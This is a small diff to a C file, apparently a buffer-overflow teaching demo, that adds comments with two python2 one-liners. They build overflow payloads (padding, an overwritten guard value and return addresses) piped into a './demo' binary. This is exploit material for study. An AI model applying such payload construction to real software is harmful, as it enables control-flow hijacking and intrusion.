@@ -32,6 +32,11 @@ void bye() {
  */
 
 /*
+ * python2 -c 'print "A" * (0x2c - 0x8) + "\xef\xcd\xab\x00" + "B" * 8 + "\x16\x92\x04\x08" + "\x43\x92\x04\x08"' | ./demo
+ * python2 -c 'print "A" * (0x2c - 0x8) + "\xef\xcd\xab\x00" + "B" * 8 + "\x16\x92\x04\x08" + "\x43\x92\x04\x08" + "\x78\x56\x34\x12"' | ./demo
+ */
+
+/*
  * dmesg | tail -n 2
  */
 
